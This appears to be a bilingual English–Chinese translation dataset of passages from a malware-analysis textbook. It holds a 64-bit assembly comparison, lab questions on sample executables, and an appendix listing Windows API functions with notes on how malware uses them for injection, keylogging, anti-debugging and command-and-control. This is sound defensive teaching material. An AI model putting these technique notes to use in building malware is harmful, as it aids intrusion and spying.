  type: TYPE_NORMAL
  zh: '**64位提示恶意软件功能**'
- en: Certain features in 64-bit code can provide additional clues to malware functionality
    that are not available in 32-bit code. These features are conventional and generally
    apply only to compiler-generated code.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 64位代码中的某些功能可以提供在32位代码中不可用的有关恶意软件功能的额外线索。这些功能是传统的，并且通常仅适用于编译器生成的代码。
- en: For example, it is typically easier in 64-bit code to differentiate between
    pointers and data values. The most common size for storing integers is 32 bits,
    although that is not a requirement. Still, even when simply storing an index value
    that iterates from 1 to 100, most programmers will choose a 32-bit integer for
    storage.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，在64位代码中通常更容易区分指针和数据值。存储整数的最常见大小是32位，尽管这不是必需的。然而，即使只是存储一个从1到100迭代的索引值，大多数程序员也会选择32位整数进行存储。
- en: Table 21-1 shows the 32-bit and 64-bit versions of the same function call.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 表21-1展示了相同函数调用的32位和64位版本。
- en: '**Table 21-1:** 32-bit and 64-bit Function Calls with Two Parameters **32-bit
    assembly listing**'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: '**表21-1：** 32位和64位带有两个参数的函数调用 **32位汇编列表**'
- en: '**64-bit assembly listing**'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: '**64位汇编列表**'
- en: 004114F2 mov eax, [ebp+var_8]
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 004114F2 mov eax, [ebp+var_8]
- en: 0000000140001148mov rdx, [rsp+38h+var_18]
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 0000000140001148mov rdx, [rsp+38h+var_18]
- en: 004114F5 push eax
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 004114F5 push eax
- en: 000000014000114D
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 000000014000114D
- en: mov ecx, [rsp+38h+var_10]
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: mov ecx, [rsp+38h+var_10]
- en: 004114F6 mov ecx, [ebp+var_14]
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 004114F6 mov ecx, [ebp+var_14]
- en: '0000000140001151'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: '0000000140001151'
- en: call sub_14000100A
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: call sub_14000100A
- en: 004114F9 push ecx
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 004114F9 push ecx
- en: 004114FA call sub_411186
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 004114FA call sub_411186
- en: In the 32-bit assembly shown on the left, there are two parameters to the function
    sub_411186\. We have no information about the types or purposes of the parameters,
    other than that they are both 32 bits.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 在左侧显示的32位汇编代码中，函数sub_411186有两个参数。我们不知道参数的类型或用途，只知道它们都是32位。
- en: In the 64-bit assembly shown on the right, we also see two parameters, but now
    we have additional information. The first mov instruction at  moves the value
    into RDX, which tells us that this is a 64-bit value—probably a pointer. The second
    parameter is being moved into ECX, which tells us that **448**
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 在右侧显示的64位汇编代码中，我们同样看到两个参数，但现在我们有了额外的信息。第一条mov指令将值移动到RDX中，这告诉我们这是一个64位值——很可能是一个指针。第二个参数被移动到ECX中，这告诉我们**448**
- en: Chapter 21
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 第21章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: it is a 32-bit value, because ECX is the 32-bit version of the RCX register.
    This can’t be a pointer, because pointers are 64 bits. We still don’t know whether
    this parameter is an integer, handle, or something else, but when you’re starting
    to understand a function, these little clues can be crucial to determining what
    a function does.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 它是一个32位值，因为ECX是RCX寄存器的32位版本。这不可能是一个指针，因为指针是64位的。我们仍然不知道这个参数是整数、句柄还是其他什么，但当你开始理解一个函数时，这些小线索对于确定函数的功能至关重要。
- en: '**Conclusion**'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: '**结论**'
- en: Analyzing 64-bit malware is not much different from analyzing 32-bit malware,
    because the instructions and concepts are very similar. Malware analysts need
    to understand how function calling and stack usage are accomplished in order to
    determine how many parameters and local variables each function has. It’s also
    important to understand the WOW64 subsystem in case you need to analyze a 32-bit
    executable that modifies system directories or registry keys used by the OS. Most
    malware is still 32-bit, but the amount of 64-bit malware continues to grow, and
    its use will extend even more in the future.
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 分析64位恶意软件与分析32位恶意软件没有太大区别，因为指令和概念非常相似。恶意软件分析师需要了解函数调用和堆栈使用是如何完成的，以便确定每个函数有多少参数和局部变量。了解WOW64子系统也很重要，以防你需要分析修改系统目录或操作系统使用的注册表键的32位可执行文件。尽管大多数恶意软件仍然是32位的，但64位恶意软件的数量仍在持续增长，其使用将在未来进一步扩展。
- en: 64-Bit Malware
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 64位恶意软件
- en: '**449**'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: '**449**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**L A B S**'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验**'
- en: You’ll need a 64-bit computer and a 64-bit virtual machine in order to run the
    malware for these labs, as well as the advanced version of IDA Pro in order to
    analyze the malware.
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 为了运行这些实验室的恶意软件以及分析恶意软件的高级版本IDA Pro，您需要一个64位计算机和一个64位虚拟机。
- en: '**Lab 21-1**'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验21-1**'
- en: Analyze the code in *Lab21-01.exe*. This lab is similar to Lab 9-2, but tweaked
    and compiled for a 64-bit system.
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 分析*Lab21-01.exe*中的代码。此实验与实验9-2相似，但经过调整并编译为64位系统。
- en: '***Questions***'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: What happens when you run this program without any parameters?
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 当您在没有参数的情况下运行此程序时会发生什么？
- en: 2\.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: Depending on your version of IDA Pro, main may not be recognized automatically.
    How can you identify the call to the main function?
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 根据您的IDA Pro版本，主函数可能不会被自动识别。您如何识别对主函数的调用？
- en: 3\.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: What is being stored on the stack in the instructions from 0x0000000140001150
    to 0x0000000140001161?
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 0x0000000140001150到0x0000000140001161的指令中存储了什么？
- en: 4\.
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: How can you get this program to run its payload without changing the filename
    of the executable?
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 您如何让此程序运行其有效负载而不更改可执行文件的名称？
- en: 5\.
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 5\.
- en: Which two strings are being compared by the call to strncmp at 0x0000000140001205?
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 在0x0000000140001205处的strncmp调用比较了哪两个字符串？
- en: 6\.
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 6\.
- en: Does the function at 0x00000001400013C8 take any parameters?
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 0x00000001400013C8处的函数是否接受任何参数？
- en: 7\.
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 7\.
- en: How many arguments are passed to the call to CreateProcess at 0x0000000140001093?
    How do you know?
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 在0x0000000140001093处的CreateProcess调用传递了多少个参数？您是如何知道的？
- en: '**Lab 21-2**'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验21-2**'
- en: Analyze the malware found in *Lab21-02.exe* on both x86 and x64 virtual machines.
    This malware is similar to *Lab12-01.exe*, with an added x64
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 在x86和x64虚拟机上分析*Lab21-02.exe*中找到的恶意软件。这种恶意软件与*Lab12-01.exe*相似，增加了x64
- en: component.
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 组件。
- en: '***Questions***'
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: What is interesting about the malware’s resource sections?
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件的资源部分有什么有趣的地方？
- en: 2\.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: Is this malware compiled for x64 or x86?
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 这恶意软件是针对x64还是x86编译的？
- en: 3\.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: How does the malware determine the type of environment in which it is running?
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件如何确定它正在运行的环境的类型？
- en: 4\.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: What does this malware do differently in an x64 environment versus an x86 environment?
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 与x86环境相比，这种恶意软件在x64环境中的行为有何不同？
- en: 5\.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 5\.
- en: Which files does the malware drop when running on an x86 machine?
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件在x86机器上运行时会放下哪些文件？
- en: Where would you find the file or files?
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 您在哪里可以找到文件或文件？
- en: '**450**'
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: '**450**'
- en: Chapter 21
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 第21章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 6\.
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 6\.
- en: Which files does the malware drop when running on an x64 machine?
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件在x64机器上运行时会放下哪些文件？
- en: Where would you find the file or files?
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 您在哪里可以找到文件或文件？
- en: 7\.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 7\.
- en: What type of process does the malware launch when run on an x64
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件在x64系统上运行时启动了什么类型的进程？
- en: system?
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 系统？
- en: 8\.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 8\.
- en: What does the malware do?
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件做了什么？
- en: 64-Bit Malware
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 64位恶意软件
- en: '**451**'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: '**451**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**I M P O R T A N T W I N D O W S**'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: '**重要的Windows**'
- en: '**F U N C T I O N S**'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: '**函数**'
- en: This appendix contains a list of Windows functions
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 此附录包含Windows函数列表
- en: commonly encountered by malware analysts, along
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 通常由恶意软件分析师遇到，以及
- en: with a short description of each one and how it is likely to be used by malware.
    Most of these functions are
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 每个函数的简短描述以及它可能被恶意软件如何使用。大多数这些功能都是恶意软件分析师经常遇到的，以及
- en: already documented by Microsoft, and this appendix is not intended to rehash
    that information. The Microsoft documentation is extremely useful and describes
    almost every function exported by a Microsoft DLL, although it can be lengthy
    and technical.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 已经由微软记录，此附录无意重复该信息。微软的文档非常有用，描述了几乎由微软DLL导出的每个函数，尽管它可能很长且技术性。
- en: You can use this appendix as a reference when performing basic static analysis,
    whether you’re trying to glean information from the import table or just looking
    for advanced techniques to point you in the right direction.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以在执行基本静态分析时使用此附录作为参考，无论是试图从导入表中获取信息，还是仅仅寻找指向正确方向的先进技术。
- en: Once you’ve determined which functions are most relevant for a particular piece
    of malware, you will need to analyze those functions in disassembly and use the
    Microsoft documentation to learn the purpose of each parameter.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦确定了对特定恶意软件最相关的函数，就需要在反汇编中分析这些函数，并使用微软文档来学习每个参数的目的。
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**NOTE**'
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*This appendix presents a selective list of functions. We have excluded functions*
    *whose purpose should be clear from the function name alone, such as ReadFile
    and* *DeleteFile.*'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: '*本附录列出了一些函数的选择性列表。我们排除了仅从函数名本身就可以清楚了解其目的的函数，例如ReadFile和DeleteFile。*'
- en: '**accept**'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: '**accept**'
- en: Used to listen for incoming connections. This function indicates that the program
    will listen for incoming connections on a socket.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 用于监听传入的连接。此函数表示程序将在套接字上监听传入的连接。
- en: '**AdjustTokenPrivileges**'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: '**AdjustTokenPrivileges**'
- en: Used to enable or disable specific access privileges. Malware that performs
    process injection often calls this function to gain additional permissions.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 用于启用或禁用特定访问权限。执行进程注入的恶意软件通常会调用此函数以获取额外的权限。
- en: '**AttachThreadInput**'
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: '**AttachThreadInput**'
- en: Attaches the input processing for one thread to another so that the second thread
    receives input events such as keyboard and mouse events.
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 将一个线程的输入处理附加到另一个线程，以便第二个线程接收输入事件，如键盘和鼠标事件。
- en: Keyloggers and other spyware use this function.
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 键盘记录器和其他间谍软件使用此功能。
- en: '**bind**'
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: '**bind**'
- en: Used to associate a local address to a socket in order to listen for incoming
    connections.
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 用于将本地地址关联到套接字，以便监听传入的连接。
- en: '**BitBlt**'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: '**BitBlt**'
- en: Used to copy graphic data from one device to another. Spyware sometimes uses
    this function to capture screenshots. This function is often added by the compiler
    as part of library code.
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 用于从一台设备复制图形数据到另一台设备。间谍软件有时使用此函数来捕获屏幕截图。此函数通常由编译器作为库代码的一部分添加。
- en: '**CallNextHookEx**'
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: '**CallNextHookEx**'
- en: Used within code that is hooking an event set by SetWindowsHookEx.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 在设置SetWindowsHookEx设置的事件的钩子代码中使用。
- en: CallNextHookEx calls the next hook in the chain. Analyze the function calling
    CallNextHookEx to determine the purpose of a hook set by SetWindowsHookEx.
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: CallNextHookEx调用链中的下一个钩子。分析调用CallNextHookEx的函数，以确定由SetWindowsHookEx设置的钩子的目的。
- en: '**CertOpenSystemStore**'
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: '**CertOpenSystemStore**'
- en: Used to access the certificates stored on the local system.
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 用于访问本地系统上存储的证书。
- en: '**CheckRemoteDebuggerPresent**'
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: '**CheckRemoteDebuggerPresent**'
- en: Checks to see if a specific process (including your own) is being debugged.
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 检查是否有一个特定的进程（包括你自己的）正在被调试。
- en: This function is sometimes used as part of an anti-debugging technique.
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 此函数有时用作反调试技术的一部分。
- en: '**CoCreateInstance**'
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: '**CoCreateInstance**'
- en: Creates a COM object. COM objects provide a wide variety of functionality. The
    class identifier (CLSID) will tell you which file contains the code that implements
    the COM object. See Chapter 7 for an in-depth explanation of COM.
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 创建一个COM对象。COM对象提供广泛的功能。类标识符（CLSID）将告诉您哪个文件包含实现COM对象的代码。请参阅第7章以深入了解COM。
- en: '**connect**'
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: '**connect**'
- en: Used to connect to a remote socket. Malware often uses low-level functionality
    to connect to a command-and-control server.
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 用于连接到远程套接字。恶意软件通常使用低级功能来连接到命令和控制服务器。
- en: '**454**'
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: '**454**'
- en: Appendix A
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 附录A
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**ConnectNamedPipe**'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: '**ConnectNamedPipe**'
- en: Used to create a server pipe for interprocess communication that will wait for
    a client pipe to connect. Backdoors and reverse shells sometimes use ConnectNamedPipe
    to simplify connectivity to a command-and-control server.
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 用于创建一个用于进程间通信的服务器管道，该管道将等待客户端管道连接。后门和反向shell有时使用ConnectNamedPipe来简化与命令和控制服务器的连接。
- en: '**ControlService**'
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: '**ControlService**'
- en: Used to start, stop, modify, or send a signal to a running service. If malware
    is using its own malicious service, you’ll need to analyze the code that implements
    the service in order to determine the purpose of the call.
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: 用于启动、停止、修改或向运行中的服务发送信号。如果恶意软件正在使用其自己的恶意服务，则需要分析实现该服务的代码，以确定调用的目的。
- en: '**CreateFile**'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: '**CreateFile**'
- en: Creates a new file or opens an existing file.
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: 创建新文件或打开现有文件。
- en: '**CreateFileMapping**'
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: '**CreateFileMapping**'
- en: Creates a handle to a file mapping that loads a file into memory and makes it
    accessible via memory addresses. Launchers, loaders, and injectors use this function
    to read and modify PE files.
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 创建一个文件映射句柄，将文件加载到内存中并通过内存地址使其可访问。启动器、加载器和注入器使用此函数来读取和修改PE文件。
- en: '**CreateMutex**'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: '**CreateMutex**'
- en: Creates a mutual exclusion object that can be used by malware to ensure that
    only a single instance of the malware is running on a system at any given time.
    Malware often uses fixed names for mutexes, which can be good host-based indicators
    to detect additional installations of the malware.
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 创建一个互斥对象，恶意软件可以使用它来确保在任何给定时间只有一个恶意软件实例在系统上运行。恶意软件通常使用固定的名称作为互斥锁，这可以作为基于主机的指示器来检测恶意软件的额外安装。
- en: '**CreateProcess**'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: '**CreateProcess**'
- en: Creates and launches a new process. If malware creates a new process, you will
    need to analyze the new process as well.
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 创建并启动一个新的进程。如果恶意软件创建了一个新的进程，您还需要分析这个新进程。
- en: '**CreateRemoteThread**'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: '**CreateRemoteThread**'
- en: Used to start a thread in a remote process (one other than the calling process).
    Launchers and stealth malware use CreateRemoteThread to inject code into a different
    process.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 用于在远程进程（除了调用进程之外）中启动一个线程。启动器和隐蔽恶意软件使用CreateRemoteThread将代码注入到不同的进程。
- en: '**CreateService**'
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: '**CreateService**'
- en: Creates a service that can be started at boot time. Malware uses CreateService
    for persistence, stealth, or to load kernel drivers.
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 创建一个在启动时可以启动的服务。恶意软件使用CreateService来实现持久性、隐蔽性或加载内核驱动程序。
- en: '**CreateToolhelp32Snapshot**'
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: '**CreateToolhelp32Snapshot**'
- en: Used to create a snapshot of processes, heaps, threads, and modules.
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 用于创建进程、堆、线程和模块的快照。
- en: Malware often uses this function as part of code that iterates through processes
    or threads.
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件通常将此函数作为遍历进程或线程的代码的一部分使用。
- en: '**CryptAcquireContext**'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: '**CryptAcquireContext**'
- en: Often the first function used by malware to initialize the use of Windows encryption.
    There are many other functions associated with encryption, most of which start
    with Crypt.
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，恶意软件初始化Windows加密使用的第一个函数。还有许多与加密相关的其他函数，其中大多数以Crypt开头。
- en: '**DeviceIoControl**'
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: '**DeviceIoControl**'
- en: Sends a control message from user space to a device driver. DeviceIoControl
    is popular with kernel malware because it is an easy, flexible way to pass information
    between user space and kernel space.
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: 从用户空间向设备驱动程序发送控制消息。DeviceIoControl在内核恶意软件中很受欢迎，因为它是一种简单、灵活地在用户空间和内核空间之间传递信息的方法。
- en: Important Windows Functions
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 重要Windows函数
- en: '**455**'
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: '**455**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**DllCanUnloadNow**'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: '**DllCanUnloadNow**'
- en: An exported function that indicates that the program implements a COM server.
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 一个导出函数，表示程序实现了COM服务器。
- en: '**DllGetClassObject**'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: '**DllGetClassObject**'
- en: An exported function that indicates that the program implements a COM server.
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 一个导出函数，表示程序实现了COM服务器。
- en: '**DllInstall**'
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: '**DllInstall**'
- en: An exported function that indicates that the program implements a COM server.
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 一个导出函数，表示程序实现了COM服务器。
- en: '**DllRegisterServer**'
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: '**DllRegisterServer**'
- en: An exported function that indicates that the program implements a COM server.
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 一个导出函数，表示程序实现了COM服务器。
- en: '**DllUnregisterServer**'
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: '**DllUnregisterServer**'
- en: An exported function that indicates that the program implements a COM server.
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 一个导出函数，表示程序实现了COM服务器。
- en: '**EnableExecuteProtectionSupport**'
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: '**EnableExecuteProtectionSupport**'
- en: An undocumented API function used to modify the Data Execution Protection (DEP)
    settings of the host, making it more susceptible to attack.
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 一个未记录的API函数，用于修改宿主机的数据执行保护（DEP）设置，使其更容易受到攻击。
- en: '**EnumProcesses**'
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: '**EnumProcesses**'
- en: Used to enumerate through running processes on the system. Malware often enumerates
    through processes to find a process to inject into.
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 用于枚举系统上正在运行的过程。恶意软件通常会枚举过程以找到要注入的进程。
- en: '**EnumProcessModules**'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: '**EnumProcessModules**'
- en: Used to enumerate the loaded modules (executables and DLLs) for a given process.
    Malware enumerates through modules when doing injection.
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 用于枚举给定进程加载的模块（可执行文件和DLL）。恶意软件在注入时会枚举模块。
- en: '**FindFirstFile/FindNextFile**'
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: '**FindFirstFile/FindNextFile**'
- en: Used to search through a directory and enumerate the filesystem.
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 用于搜索目录并枚举文件系统。
- en: '**FindResource**'
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: '**FindResource**'
- en: Used to find a resource in an executable or loaded DLL. Malware sometimes uses
    resources to store strings, configuration information, or other malicious files.
    If you see this function used, check for a .rsrc section in the malware’s PE header.
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 用来在可执行文件或已加载的DLL中查找资源。恶意软件有时使用资源来存储字符串、配置信息或其他恶意文件。如果您看到此功能被使用，请检查恶意软件的PE头中的.rsrc部分。
- en: '**FindWindow**'
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: '**FindWindow**'
- en: Searches for an open window on the desktop. Sometimes this function is used
    as an anti-debugging technique to search for OllyDbg windows.
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 在桌面上搜索一个打开的窗口。有时此函数被用作反调试技术来搜索OllyDbg窗口。
- en: '**FtpPutFile**'
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: '**FtpPutFile**'
- en: A high-level function for uploading a file to a remote FTP server.
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 一个用于上传文件到远程FTP服务器的函数。
- en: '**GetAdaptersInfo**'
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetAdaptersInfo**'
- en: Used to obtain information about the network adapters on the system.
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 用来获取系统上网络适配器的信息。
- en: Backdoors sometimes call GetAdaptersInfo as part of a survey to gather information
    about infected machines. In some cases, it’s used to gather MAC addresses to check
    for VMware as part of anti-virtual machine techniques.
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: 后门有时将GetAdaptersInfo作为调查的一部分来收集有关受感染机器的信息。在某些情况下，它用于收集MAC地址，作为反虚拟机技术的一部分来检查VMware。
- en: '**456**'
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: '**456**'
- en: Appendix A
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 附录A
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**GetAsyncKeyState**'
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetAsyncKeyState**'
